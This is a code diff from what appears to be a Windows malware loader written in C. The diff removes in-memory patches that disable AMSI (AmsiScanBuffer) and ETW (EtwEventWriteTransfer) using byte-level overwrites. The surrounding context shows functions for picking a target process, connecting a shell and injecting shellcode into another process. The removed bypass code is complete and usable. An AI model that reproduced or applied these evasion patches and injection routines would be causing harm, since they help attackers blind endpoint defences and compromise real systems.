@@ -57,42 +57,6 @@ DWORD get_target_pid() {
     return pid;
 }
 
-void patch_amsi() {
-    HMODULE amsi = LoadLibraryA("amsi.dll");
-    if (amsi == NULL) return;
-
-    void* api_address = GetProcAddress(amsi, "AmsiScanBuffer");
-    if (api_address == NULL) return;
-
-    DWORD old_protect;
-    VirtualProtect(api_address, 6, PAGE_EXECUTE_READWRITE, &old_protect);
-
-    // mov eax,0x80070057
-    // c3
-    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
-    memcpy(api_address, patch, sizeof(patch));
-
-    VirtualProtect(api_address, 6, old_protect, &old_protect);
-}
-
-void patch_etw() {
-    HMODULE ntdll = LoadLibraryA("ntdll.dll");
-    if (ntdll == NULL) return;
-
-    void* api_address = GetProcAddress(ntdll, "EtwEventWriteTransfer");
-    if (api_address == NULL) return;
-
-    DWORD old_protect;
-    VirtualProtect(api_address, 3, PAGE_EXECUTE_READWRITE, &old_protect);
-
-    // xor eax,eax
-    // c3
-    unsigned char patch[] = {0x31, 0xC0, 0xC3};
-    memcpy(api_address, patch, sizeof(patch));
-
-    VirtualProtect(api_address, 3, old_protect, &old_protect);
-}
-
 void connect_shell() {
     WSADATA wsa;
     SOCKET socket;
@@ -135,8 +99,6 @@ int main() {
     // end with \xc3
     unsigned char shellcode[] = "SHELLCODE HERE";
 
-    patch_amsi();
-    patch_etw();
     SIZE_T shellcode_size = sizeof(shellcode);
     if (process_injection(pid, shellcode, shellcode_size)) {
         ExitProcess(0);
